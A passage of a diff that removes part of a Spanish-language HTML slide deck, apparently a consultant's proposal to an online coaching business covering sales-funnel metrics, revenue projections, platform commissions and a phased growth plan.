-        <div style="flex:1; font-size:17px; color:var(--grey); line-height:1.55;">
-          Los dos únicos números que tienes son los dos últimos. Si se mejoran es obvio que el resultado va a cambiar, pero es esencial medirlo todo.<br><br>
-          Los cuatro de arriba hoy no se miden. Si mañana el cierre mejora, no vas a saber por qué. Y si empeora, tampoco.
-        </div>
-        <div style="flex:1;">
-          <div class="quote-block" style="margin-top:0;">
-            <p>"Antes de traerte más gente, hay que arreglar lo que se pierde con la que ya llega."</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>DIAGNÓSTICO · 04</span>
-    <span>04 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 05 — EL COSTE DE ENTERARTE TARDE
-     ============================================================ -->
-<section class="slide" data-slide-number="05" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>DIAGNÓSTICO · 04 — MEDICIÓN</span></div>
-
-  <div class="slide-content">
-    <div style="display:flex; flex-direction:column; height:100%; justify-content:space-between;">
-
-      <!-- Título muy grande -->
-      <div style="max-width:1300px;">
-        <div class="h1" style="font-size:90px; text-transform:uppercase;">HOY LOS NÚMEROS SE MIRAN<br>A FIN DE MES.</div>
-        <div class="h1" style="font-size:90px; color:var(--green);">TU NEGOCIO NECESITA<br>MIRARLOS CADA DÍA.</div>
-      </div>
-
-      <!-- Texto central -->
-      <div style="max-width:900px;">
-        <div style="font-size:22px; line-height:1.55; color:var(--grey);">
-          Cuando una closer encadena 10 llamadas sin cerrar, lo descubres cuando el mes ya está perdido. Esas 10 llamadas eran 10 oportunidades reales que no vuelven.
-        </div>
-      </div>
-
-      <!-- Frase destacada -->
-      <div style="max-width:1100px;">
-        <div style="font-size:32px; font-weight:600; color:var(--green); line-height:1.3;">
-          Un negocio que solo mira los números a fin de mes difícilmente puede reaccionar a tiempo.
-        </div>
-      </div>
-
-      <!-- Cita -->
-      <div class="quote-block">
-        <p>"Con métricas en el día, un problema cuesta una semana. Sin ellas, cuesta un mes entero."</p>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>DIAGNÓSTICO · 05</span>
-    <span>05 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 06 — LOS NÚMEROS CON RATIOS SANOS
-     ============================================================ -->
-<section class="slide" data-slide-number="06" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>OPORTUNIDAD · 01 — PROYECCIÓN</span></div>
-
-  <div class="slide-content" style="padding-top:32px;">
-    <div class="h1" style="font-size:58px; margin-bottom:32px;">MISMO CONTENIDO. MISMA AUDIENCIA. CERO DÓLARES EN ADS.</div>
-
-    <div style="display:flex; gap:0; height:calc(100% - 120px);">
-
-      <!-- MITAD IZQUIERDA — Paso 1 -->
-      <div style="flex:1; padding-right:48px; display:flex; flex-direction:column; justify-content:space-between;">
-        <div>
-          <div class="eyebrow" style="margin-bottom:16px;">PASO 1 — SOLO ARREGLANDO SHOW Y CIERRE, CON LAS MISMAS AGENDAS</div>
-          <table style="margin-bottom:20px;">
-            <thead>
-              <tr><th></th><th>HOY</th><th>ARREGLADO</th></tr>
-            </thead>
-            <tbody>
-              <tr><td>Agendas</td><td class="muted">32</td><td>32</td></tr>
-              <tr><td>Show rate</td><td class="muted">52%</td><td style="color:var(--white);font-weight:600;">80%</td></tr>
-              <tr><td>Close rate</td><td class="muted">23,8%</td><td style="color:var(--white);font-weight:600;">40%</td></tr>
-              <tr><td>Cierres</td><td class="muted">4</td><td style="color:var(--white);font-weight:600;">10</td></tr>
-              <tr style="border-bottom:none;"><td>Facturación HT</td><td class="muted">$4.444</td><td class="accent">$11.110</td></tr>
-            </tbody>
-          </table>
-
-          <div style="font-size:140px; font-weight:700; line-height:0.9; color:var(--green); letter-spacing:-0.03em;">×2,5</div>
-
-          <div class="highlight-block" style="margin-top:20px;">
-            <p style="font-size:17px;">Solo con esto, el negocio pasa de <strong>$7.200</strong> a <span style="color:var(--green); font-weight:700;">$13.866 al mes</span>. Casi el doble, sin traer un solo lead nuevo.</p>
-          </div>
-        </div>
-      </div>
-
-      <!-- Hairline vertical -->
-      <div class="hairline-v"></div>
-
-      <!-- MITAD DERECHA — Paso 2 -->
-      <div style="flex:1; padding-left:48px; display:flex; flex-direction:column; justify-content:space-between;">
-        <div>
-          <div class="eyebrow" style="margin-bottom:16px;">PASO 2 — CON EL SETTING FUNCIONANDO</div>
-          <table style="margin-bottom:20px;">
-            <thead>
-              <tr><th></th><th>HOY</th><th>SISTEMA COMPLETO</th></tr>
-            </thead>
-            <tbody>
-              <tr><td>Agendas</td><td class="muted">32</td><td style="color:var(--white);font-weight:600;">65</td></tr>
-              <tr><td>Cierres</td><td class="muted">4</td><td style="color:var(--white);font-weight:600;">21</td></tr>
-              <tr style="border-bottom:none;"><td>Facturación HT</td><td class="muted">$4.444</td><td class="accent">$23.331</td></tr>
-            </tbody>
-          </table>
-
-          <div style="font-size:140px; font-weight:700; line-height:0.9; color:var(--green); letter-spacing:-0.03em;">×5,2</div>
-        </div>
-
-        <div style="font-size:14px; color:var(--grey); line-height:1.5; margin-top:16px;">
-          El 80% y el 40% son el suelo de lo que se considera sano. Lo único que estimo son las 65 agendas, porque no tengo tus datos de DMs. Bájalo a 50 si te parece agresivo: siguen siendo 16 cierres.
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>OPORTUNIDAD · 06</span>
-    <span>06 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 07 — LO QUE CUESTA ESPERAR
-     ============================================================ -->
-<section class="slide" data-slide-number="07" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>OPORTUNIDAD · 02 — COSTE DE INACCIÓN</span></div>
-
-  <div class="slide-content">
-    <div style="display:flex; gap:100px; height:100%; align-items:flex-start;">
-
-      <!-- Columna izquierda: cifra hero + título -->
-      <div style="flex:0 0 560px; display:flex; flex-direction:column; justify-content:space-between; height:100%;">
-        <div>
-          <div class="h1" style="font-size:72px; margin-bottom:40px;">CADA MES<br>QUE PASA</div>
-          <div style="font-size:200px; font-weight:700; line-height:0.88; letter-spacing:-0.03em; color:var(--green);">$6.666</div>
-          <div style="font-size:18px; color:var(--grey); margin-top:16px; max-width:420px; line-height:1.5;">
-            es lo que deja de entrar cada mes solo por el show rate y el close rate
-          </div>
-        </div>
-
-        <div class="quote-block">
-          <p>"El negocio no está parado. Está perdiendo. Y la cuenta corre igual mientras se decide."</p>
-        </div>
-      </div>
-
-      <!-- Hairline vertical -->
-      <div class="hairline-v"></div>
-
-      <!-- Columna derecha: tabla acumulado -->
-      <div style="flex:1; display:flex; flex-direction:column; justify-content:center; gap:32px;">
-        <div class="eyebrow">COSTE ACUMULADO SI POSPONEMOS</div>
-
-        <!-- Tres filas con cifras crecientes -->
-        <div style="display:flex; flex-direction:column; gap:0;">
-          <div style="padding:24px 0; border-bottom:1px solid var(--line); display:flex; justify-content:space-between; align-items:center;">
-            <span style="font-size:18px; color:var(--grey);">Si empezamos en Octubre</span>
-            <span style="font-size:52px; font-weight:700; color:var(--white);">$6.666</span>
-          </div>
-          <div style="padding:24px 0; border-bottom:1px solid var(--line); display:flex; justify-content:space-between; align-items:center;">
-            <span style="font-size:18px; color:var(--grey);">Si empezamos en Noviembre</span>
-            <span style="font-size:70px; font-weight:700; color:var(--white);">$13.332</span>
-          </div>
-          <div style="padding:24px 0; display:flex; justify-content:space-between; align-items:center;">
-            <span style="font-size:18px; color:var(--grey);">Si empezamos en Diciembre</span>
-            <span style="font-size:90px; font-weight:700; color:var(--green);">$19.998</span>
-          </div>
-        </div>
-
-        <div style="font-size:18px; color:var(--grey); line-height:1.55;">
-          Y esto es solo el Paso 1. Sin el setting arreglado, sin activos reactivados, sin YouTube. Con las mismas 32 agendas que ya tienes.
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>OPORTUNIDAD · 07</span>
-    <span>07 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 08 — DINERO QUE SE VA SIN QUE LO VEAS
-     ============================================================ -->
-<section class="slide" data-slide-number="08" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>OPORTUNIDAD · 03 — COMISIONES</span></div>
-
-  <div class="slide-content">
-    <div style="display:flex; flex-direction:column; height:100%; justify-content:space-between;">
-
-      <div class="h1" style="font-size:72px; margin-bottom:32px;">HOTMART SE LLEVA UN 10%<br>DE TODO LO QUE VENDES</div>
-
-      <!-- Tabla comisiones -->
-      <table>
-        <thead>
-          <tr>
-            <th>FACTURACIÓN ANUAL</th>
-            <th>HOTMART 10%</th>
-            <th>WHOP ~3%</th>
-            <th style="background:var(--forest); color:var(--green); font-weight:700;">LO QUE PIERDES</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td>$82.000 (hoy)</td>
-            <td class="muted">$8.200</td>
-            <td class="muted">$2.460</td>
-            <td style="background:var(--forest); color:var(--green); font-size:26px; font-weight:700;">$5.740</td>
-          </tr>
-          <tr>
-            <td>$160.000</td>
-            <td class="muted">$16.000</td>
-            <td class="muted">$4.800</td>
-            <td style="background:var(--forest); color:var(--green); font-size:26px; font-weight:700;">$11.200</td>
-          </tr>
-          <tr style="border-bottom:none;">
-            <td>$240.000</td>
-            <td class="muted">$24.000</td>
-            <td class="muted">$7.200</td>
-            <td style="background:var(--forest); color:var(--green); font-size:26px; font-weight:700;">$16.800</td>
-          </tr>
-        </tbody>
-      </table>
-
-      <!-- Frase y texto -->
-      <div style="display:flex; gap:60px; align-items:flex-end;">
-        <div style="flex:1;">
-          <div style="font-size:40px; font-weight:700; color:var(--green); margin-bottom:20px;">Cuanto más crezcas, más te cuesta.</div>
-          <div style="font-size:18px; color:var(--grey); line-height:1.55;">
-            Tengo contactos en Whop y en Fanbasis. Ambas tienen financiación integrada, que además ataca directamente la barrera de precio en tus llamadas.
-          </div>
-        </div>
-        <div style="flex:1;">
-          <div class="quote-block" style="margin-top:0;">
-            <p>"Casi seis mil al año, hoy. Y subiendo con cada mes bueno."</p>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>OPORTUNIDAD · 08</span>
-    <span>08 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 09 — ACTIVOS PARADOS
-     ============================================================ -->
-<section class="slide" data-slide-number="09" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>OPORTUNIDAD · 04 — ACTIVOS SIN EXPLOTAR</span></div>
-
-  <div class="slide-content" style="padding-top:28px;">
-    <div style="display:flex; gap:60px; height:100%;">
-
-      <!-- Columna izquierda: tabla + cifra hero -->
-      <div style="flex:3; display:flex; flex-direction:column; gap:24px;">
-        <div class="h1" style="font-size:58px; margin-bottom:4px;">LO QUE YA TIENES HECHO<br>Y NO GENERA NADA</div>
-
-        <table style="font-size:16px;">
-          <thead>
-            <tr>
-              <th>ACTIVO</th>
-              <th>ESTADO</th>
-              <th>LO QUE NO ENTRA</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td style="font-size:16px;"><strong>3.000 exalumnas</strong></td>
-              <td class="muted" style="font-size:15px;">Sin estrategia de ascensión</td>
-              <td class="accent" style="font-size:15px;">$22.000 – $33.000 con estrategia de ascensión (1% de la base)</td>
-            </tr>
-            <tr>
-              <td style="font-size:16px;"><strong>Rechazadas en WhatsApp</strong></td>
-              <td class="muted" style="font-size:15px;">Nutridas a mano, sin proceso</td>
-              <td class="accent" style="font-size:15px;">~$4.400/mes — 4 recuperaciones al mes de leads que ya tuvieron llamada</td>
-            </tr>
-            <tr>
-              <td style="font-size:16px;"><strong>Programas grabados</strong></td>
-              <td class="muted" style="font-size:15px;">Validados, empaquetados, sin vender</td>
-              <td class="accent" style="font-size:15px;">~$2.000/mes de cross-sell</td>
-            </tr>
-            <tr style="border-bottom:none;">
-              <td style="font-size:16px;"><strong>YouTube</strong></td>
-              <td class="muted" style="font-size:15px;">Sin activar</td>
-              <td class="accent" style="font-size:15px;">~$5.500/mes a medio plazo*</td>
-            </tr>
-          </tbody>
-        </table>
-        <div style="font-size:12px; color:var(--grey); font-style:italic;">* YouTube es la única de las cuatro que requiere tiempo de maduración.</div>
-
-        <!-- Bloque diferenciado $6.666 -->
-        <div style="border-left:4px solid var(--green); padding:16px 24px; background:rgba(11,61,46,0.3);">
-          <div style="font-size:13px; text-transform:uppercase; letter-spacing:0.15em; color:var(--grey); margin-bottom:8px;">ACLARACIÓN</div>
-          <div style="font-size:16px; color:var(--white); line-height:1.5;">
-            Esto es aparte de los <span class="green" style="font-weight:700;">$6.666 del embudo</span>. Son cosas distintas: aquello es lo que se pierde con la gente que ya llega. Esto es lo que directamente no se está tocando.
-          </div>
-        </div>
-      </div>
-
-      <!-- Hairline vertical -->
-      <div class="hairline-v"></div>
-
-      <!-- Columna derecha: cifra hero + textos -->
-      <div style="flex:1.5; display:flex; flex-direction:column; justify-content:space-between;">
-        <div>
-          <div style="font-size:90px; font-weight:700; line-height:0.9; color:var(--green); letter-spacing:-0.02em;">+$6.400</div>
-          <div style="font-size:16px; font-weight:700; color:var(--green); letter-spacing:0.05em; text-transform:uppercase; margin-bottom:4px;">AL MES PARADOS</div>
-          <div style="font-size:14px; color:var(--grey); line-height:1.5; margin-bottom:24px;">sin contar YouTube, y más $22.000–33.000 de un solo webinar a tu propia base</div>
-          <div style="font-size:20px; font-weight:600; color:var(--white); line-height:1.4; margin-bottom:28px;">Eso es casi otro negocio entero, encima del que ya tienes.</div>
-          <div style="font-size:16px; color:var(--grey); line-height:1.6;">
-            Tienes razón en algo que dijiste: esas 3.000 personas son un activo muy valioso del negocio. Ya te compraron, ya tuvieron resultados y ya confían. Son el lead más barato de convertir que existe.<br><br>
-            Y tienen fecha de caducidad: viven en grupos de WhatsApp, no en una lista. Cada semana se va gente que no vuelve.
-          </div>
-        </div>
-
-        <div class="quote-block" style="margin-top:20px;">
-          <p style="font-size:20px;">"Nada de esto requiere grabar contenido nuevo ni invertir un dólar. Requiere tiempo que hoy no tienes."</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>OPORTUNIDAD · 09</span>
-    <span>09 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 10 — POR QUÉ EL PRODUCTO TIENE QUE EVOLUCIONAR
-     ============================================================ -->
-<section class="slide" data-slide-number="10" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>PRODUCTO · 01 — EL LÍMITE REAL</span></div>
-
-  <div class="slide-content">
-    <div style="display:flex; gap:80px; height:100%;">
-
-      <!-- Columna izquierda -->
-      <div style="flex:1; display:flex; flex-direction:column; justify-content:space-between;">
-        <div>
-          <div class="h1" style="font-size:74px; margin-bottom:28px;">EL PRODUCTO FUNCIONA.<br><span style="color:var(--green);">EL FORMATO ES LO QUE TE LIMITA.</span></div>
-          <div style="font-size:19px; color:var(--grey); line-height:1.6; margin-bottom:28px;">
-            Tu programa está validado: 30 generaciones, ~3.000 alumnas, 90% con resultados. No hay nada que reinventar ahí.<br><br>
-            Lo que hay que ajustar es cómo se entrega, porque ahora mismo el crecimiento choca contra tus horas:
-          </div>
-
-          <!-- Tabla contraste -->
-          <table style="margin-bottom:32px;">
-            <tbody>
-              <tr style="border-bottom:1px solid var(--line);">
-                <td style="color:var(--grey); font-size:17px;">Tu capacidad de high ticket hoy</td>
-                <td style="font-size:52px; font-weight:700; color:var(--grey); text-align:right;">4-5/mes</td>
-              </tr>
-              <tr style="border-bottom:none;">
-                <td style="color:var(--white); font-size:17px;">Cierres con el embudo arreglado</td>
-                <td style="font-size:52px; font-weight:700; color:var(--green); text-align:right;">21/mes</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <div class="quote-block">
-          <p>"El producto no hay que cambiarlo. Hay que darle un formato que aguante el crecimiento sin que te cueste más horas."</p>
-        </div>
-      </div>
-
-      <!-- Hairline vertical -->
-      <div class="hairline-v"></div>
-
-      <!-- Columna derecha -->
-      <div style="flex:1; display:flex; flex-direction:column; justify-content:center;">
-        <div class="eyebrow" style="margin-bottom:28px;">TÚ MISMA LO DIJISTE</div>
-        <div style="font-size:24px; color:var(--white); line-height:1.6; margin-bottom:32px;">
-          Donde más transformación se genera y donde las alumnas perciben más valor es en los <strong style="color:var(--green);">grupales</strong>. Ahí una hora tuya llega a <span style="font-size:80px; font-weight:700; color:var(--green); line-height:1; display:inline;">60</span> personas. En un 1:1, llega a <span style="font-size:80px; font-weight:700; color:var(--grey); line-height:1; display:inline;">una</span>.
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>PRODUCTO · 10</span>
-    <span>10 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 11 — CÓMO LO OPTIMIZAMOS
-     ============================================================ -->
-<section class="slide" data-slide-number="11" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>PRODUCTO · 02 — LA SOLUCIÓN</span></div>
-
-  <div class="slide-content" style="padding-top:28px;">
-    <div style="display:flex; flex-direction:column; height:100%; gap:24px;">
-      <div class="h1" style="font-size:72px; margin-bottom:8px;">MISMO PROGRAMA,<br>MEJOR FORMATO</div>
-
-      <!-- Tres bloques numerados -->
-      <div style="display:flex; gap:32px; flex:1; align-items:stretch;">
-        <div style="flex:1; border-top:1px solid var(--line); padding-top:20px;">
-          <div style="font-size:72px; font-weight:700; color:var(--green); line-height:0.9; margin-bottom:16px;">01</div>
-          <div style="font-size:17px; font-weight:600; color:var(--white); text-transform:uppercase; letter-spacing:0.08em; margin-bottom:12px;">Los grupales pasan a ser el centro</div>
-          <div style="font-size:16px; color:var(--grey); line-height:1.55;">Es donde ya funciona mejor y donde tu tiempo rinde más. Ampliamos capacidad sin que a ti te suponga ni una hora extra: dar clase a 60 cuesta lo mismo que dar clase a 25.</div>
-        </div>
-        <div style="flex:1; border-top:1px solid var(--line); padding-top:20px;">
-          <div style="font-size:72px; font-weight:700; color:var(--green); line-height:0.9; margin-bottom:16px;">02</div>
-          <div style="font-size:17px; font-weight:600; color:var(--white); text-transform:uppercase; letter-spacing:0.08em; margin-bottom:12px;">El acompañamiento personalizado se estructura mejor</div>
-          <div style="font-size:16px; color:var(--grey); line-height:1.55;">Tu presencia sigue estando, pero organizada de forma que no dependa de agendas individuales. Las coaches que ya tienes formadas absorben lo que no requiere que seas tú.</div>
-        </div>
-        <div style="flex:1; border-top:1px solid var(--line); padding-top:20px;">
-          <div style="font-size:72px; font-weight:700; color:var(--green); line-height:0.9; margin-bottom:16px;">03</div>
-          <div style="font-size:17px; font-weight:600; color:var(--white); text-transform:uppercase; letter-spacing:0.08em; margin-bottom:12px;">Si mantienes 1:1, se posiciona donde corresponde</div>
-          <div style="font-size:16px; color:var(--grey); line-height:1.55;">Un acompañamiento individual contigo es tu producto más exclusivo y hoy está por debajo de su valor. Tú misma lo dijiste: <em>"a mí 1.100 y pico para que estés tú en una llamada me sigue pareciendo muy barato."</em> Menos plazas, ticket alto, sin que te ocupe las mañanas.</div>
-        </div>
-      </div>
-
-      <!-- Tabla comparativa -->
-      <table style="font-size:16px;">
-        <thead>
-          <tr><th></th><th>HOY</th><th style="background:var(--forest);">DESPUÉS</th></tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td>Alumnas que aguanta el producto</td>
-            <td class="muted">4-5 HT/mes</td>
-            <td style="background:var(--forest); color:var(--green); font-weight:700;">20+</td>
-          </tr>
-          <tr>
-            <td>Horas tuyas de servicio</td>
-            <td class="muted">Tope alcanzado</td>
-            <td style="background:var(--forest); color:var(--white);">Iguales o menos</td>
-          </tr>
-          <tr>
-            <td>Ticket del 1:1</td>
-            <td class="muted">$1.111</td>
-            <td style="background:var(--forest); color:var(--green); font-weight:700;">El que le corresponde</td>
-          </tr>
-          <tr style="border-bottom:none;">
-            <td>Tu papel</td>
-            <td class="muted">En cada entrega</td>
-            <td style="background:var(--forest); color:var(--white);">Grupales, contenido y marca</td>
-          </tr>
-        </tbody>
-      </table>
-
-      <div class="quote-block" style="margin-top:0;">
-        <p style="font-size:22px;">"No tocamos lo que funciona. Le damos la estructura para que quepa más gente dentro sin que tú tengas que estar en todos los sitios a la vez."</p>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>PRODUCTO · 11</span>
-    <span>11 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 12 — MIS FUNCIONES DENTRO DE TU NEGOCIO
-     ============================================================ -->
-<section class="slide" data-slide-number="12" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>COLABORACIÓN · 01 — MI ROL</span></div>
-
-  <div class="slide-content" style="padding-top:28px;">
-    <div style="display:flex; gap:60px; height:100%;">
-
-      <!-- Columna izquierda: título + frase + cita -->
-      <div style="flex:0 0 420px; display:flex; flex-direction:column; justify-content:space-between;">
-        <div>
-          <div class="h1" style="font-size:80px; margin-bottom:32px;">QUÉ HAGO<br>YO,<br>EXACTA-<br>MENTE</div>
-        </div>
-
-        <div>
-          <div class="highlight-block" style="margin-bottom:24px;">
-            <p>No entro como agencia. Sino como una persona dentro de tu negocio. Si necesito manos para algo técnico puntual, las pongo yo.</p>
-          </div>
-          <div class="quote-block" style="margin-top:0;">
-            <p style="font-size:22px;">"Querías a alguien de tu equipo, no un proveedor. Eso es lo que te propongo."</p>
-          </div>
-        </div>
-      </div>
-
-      <!-- Hairline vertical -->
-      <div class="hairline-v"></div>
-
-      <!-- Columna derecha: cinco bloques -->
-      <div style="flex:1; display:flex; flex-direction:column; gap:0; justify-content:stretch;">
-        <!-- Item 01 -->
-        <div style="padding:18px 0; border-bottom:1px solid var(--line); display:flex; gap:24px; align-items:flex-start;">
-          <div style="font-size:36px; font-weight:700; color:var(--green); line-height:0.9; flex:0 0 56px;">01</div>
-          <div>
-            <div style="font-size:15px; font-weight:600; text-transform:uppercase; letter-spacing:0.08em; color:var(--white); margin-bottom:6px;">Buscar dónde se pierde dinero, todos los días</div>
-            <div style="font-size:15px; color:var(--grey); line-height:1.5;">Comisiones, herramientas, procesos, fugas del embudo, decisiones que nadie ha tomado porque nadie tiene tiempo de mirarlas.</div>
-          </div>
-        </div>
-        <!-- Item 02 -->
-        <div style="padding:18px 0; border-bottom:1px solid var(--line); display:flex; gap:24px; align-items:flex-start;">
-          <div style="font-size:36px; font-weight:700; color:var(--green); line-height:0.9; flex:0 0 56px;">02</div>
-          <div>
-            <div style="font-size:15px; font-weight:600; text-transform:uppercase; letter-spacing:0.08em; color:var(--white); margin-bottom:6px;">Entrar yo en el sistema de ventas hasta que esté en KPIs</div>
-            <div style="font-size:15px; color:var(--grey); line-height:1.5;">Seteo yo personalmente las primeras semanas. No delego el diagnóstico: lo hago con las manos dentro.</div>
-          </div>
-        </div>
-        <!-- Item 03 -->
-        <div style="padding:18px 0; border-bottom:1px solid var(--line); display:flex; gap:24px; align-items:flex-start;">
-          <div style="font-size:36px; font-weight:700; color:var(--green); line-height:0.9; flex:0 0 56px;">03</div>
-          <div>
-            <div style="font-size:15px; font-weight:600; text-transform:uppercase; letter-spacing:0.08em; color:var(--white); margin-bottom:6px;">Poner, entrenar y gestionar al equipo comercial</div>
-            <div style="font-size:15px; color:var(--grey); line-height:1.5;">Yo busco al setter, yo lo formo, yo lo gestiono y yo respondo de que funcione. Lo mismo con las closers. Primero mido cuánta gente necesita este negocio de verdad: cada incorporación es un coste.</div>
-          </div>
-        </div>
-        <!-- Item 04 -->
-        <div style="padding:18px 0; border-bottom:1px solid var(--line); display:flex; gap:24px; align-items:flex-start;">
-          <div style="font-size:36px; font-weight:700; color:var(--green); line-height:0.9; flex:0 0 56px;">04</div>
-          <div>
-            <div style="font-size:15px; font-weight:600; text-transform:uppercase; letter-spacing:0.08em; color:var(--white); margin-bottom:6px;">Operar los lanzamientos y webinars</div>
-            <div style="font-size:15px; color:var(--grey); line-height:1.5;">Tú das el directo, que es lo tuyo. Estructura, secuencias, nutrición previa, seguimiento y cierre los llevo yo. Cada uno te va a costar menos esfuerzo que el anterior.</div>
-          </div>
-        </div>
-        <!-- Item 05 -->
-        <div style="padding:18px 0; display:flex; gap:24px; align-items:flex-start;">
-          <div style="font-size:36px; font-weight:700; color:var(--green); line-height:0.9; flex:0 0 56px;">05</div>
-          <div>
-            <div style="font-size:15px; font-weight:600; text-transform:uppercase; letter-spacing:0.08em; color:var(--white); margin-bottom:6px;">Quitarte de encima lo que no deberías tocar</div>
-            <div style="font-size:15px; color:var(--grey); line-height:1.5;">CRM, automatizaciones, coordinación del equipo, reporting, sistemas.</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>COLABORACIÓN · 12</span>
-    <span>12 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 13 — CÓMO TRABAJAMOS
-     ============================================================ -->
-<section class="slide" data-slide-number="13" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>COLABORACIÓN · 02 — DÍA A DÍA</span></div>
-
-  <div class="slide-content">
-    <div style="display:flex; gap:100px; height:100%; align-items:center;">
-
-      <!-- Título gigante izquierda -->
-      <div style="flex:1;">
-        <div class="h1" style="font-size:100px;">TÚ SIGUES<br>SIENDO<br>DUEÑA DE<br>TU NEGOCIO</div>
-      </div>
-
-      <!-- Hairline vertical -->
-      <div class="hairline-v"></div>
-
-      <!-- Cuatro bloques derecha -->
-      <div style="flex:1.2; display:flex; flex-direction:column; gap:0;">
-        <div style="padding:32px 0; border-bottom:1px solid var(--line);">
-          <div style="font-size:15px; font-weight:600; text-transform:uppercase; letter-spacing:0.1em; color:var(--green); margin-bottom:10px;">Ninguna decisión se toma sin ti</div>
-          <div style="font-size:19px; color:var(--grey); line-height:1.55;">Yo traigo el análisis, los datos y una recomendación. Tú validas. Entonces lo ejecutamos.</div>
-        </div>
-        <div style="padding:32px 0; border-bottom:1px solid var(--line);">
-          <div style="font-size:15px; font-weight:600; text-transform:uppercase; letter-spacing:0.1em; color:var(--green); margin-bottom:10px;">Ninguna decisión se toma por intuición</div>
-          <div style="font-size:19px; color:var(--grey); line-height:1.55;">Desde la semana 1 se mide todo el embudo: respuesta por reel y por story, tasa de conversación, agendamiento, show, cierre. Y qué contenido concreto trae a la que paga completo.</div>
-        </div>
-        <div style="padding:32px 0; border-bottom:1px solid var(--line);">
-          <div style="font-size:15px; font-weight:600; text-transform:uppercase; letter-spacing:0.1em; color:var(--green); margin-bottom:10px;">Reunión semanal de 45 minutos, con contacto diario</div>
-          <div style="font-size:19px; color:var(--grey); line-height:1.55;">Números, decisiones, siguiente sprint.</div>
-        </div>
-        <div style="padding:32px 0;">
-          <div style="font-size:15px; font-weight:600; text-transform:uppercase; letter-spacing:0.1em; color:var(--green); margin-bottom:10px;">Dashboard en vivo</div>
-          <div style="font-size:19px; color:var(--grey); line-height:1.55;">Lo abres cuando quieras.</div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>COLABORACIÓN · 13</span>
-    <span>13 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 14 — EL PLAN
-     ============================================================ -->
-<section class="slide" data-slide-number="14" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>EJECUCIÓN · EL PLAN</span></div>
-
-  <div class="slide-content" style="padding-top:24px;">
-    <div style="display:flex; flex-direction:column; height:100%; gap:20px;">
-      <div class="h1" style="font-size:68px; margin-bottom:4px;">EN ESTE ORDEN, Y POR ESTA RAZÓN</div>
-
-      <!-- Cuatro fases en horizontal -->
-      <div style="display:flex; gap:0; flex:1;">
-
-        <!-- FASE 1 -->
-        <div style="flex:1; border-right:1px solid var(--line); padding-right:28px; display:flex; flex-direction:column;">
-          <div style="font-size:80px; font-weight:700; color:var(--green); line-height:0.9; margin-bottom:4px;">01</div>
-          <div style="font-size:14px; font-weight:500; text-transform:uppercase; letter-spacing:0.1em; color:var(--white); margin-bottom:2px;">Arreglar el negocio</div>
-          <div style="font-size:12px; color:var(--grey); margin-bottom:14px;">~4-5 semanas</div>
-          <div style="font-size:15px; color:var(--grey); line-height:1.55; flex:1;">
-            Auditoría completa. Departamento de ventas al completo: seteo yo, SOP documentado, setters contratados y entrenados, scripts, libro de objeciones, nutrición pre-call, follow-up. Oferta, producto y pricing rediseñados. Instrumentación de todo el embudo, incluida una landing que sí registre datos.
-          </div>
-          <div style="margin-top:16px; padding-top:14px; border-top:1px solid var(--line);">
-            <span style="font-size:13px; font-weight:700; color:var(--green); text-transform:uppercase; letter-spacing:0.1em;">Al final: </span>
-            <span style="font-size:13px; color:var(--green);">el negocio deja de perder por donde pierde hoy, y por primera vez ves de dónde viene cada venta.</span>
-          </div>
-        </div>
-
-        <!-- FASE 2 -->
-        <div style="flex:1; border-right:1px solid var(--line); padding:0 28px; display:flex; flex-direction:column;">
-          <div style="font-size:80px; font-weight:700; color:var(--green); line-height:0.9; margin-bottom:4px;">02</div>
-          <div style="font-size:14px; font-weight:500; text-transform:uppercase; letter-spacing:0.1em; color:var(--white); margin-bottom:2px;">Reactivar la base de datos</div>
-          <div style="font-size:12px; color:var(--grey); margin-bottom:14px;">~semanas 5-9</div>
-          <div style="font-size:15px; color:var(--grey); line-height:1.55; flex:1;">
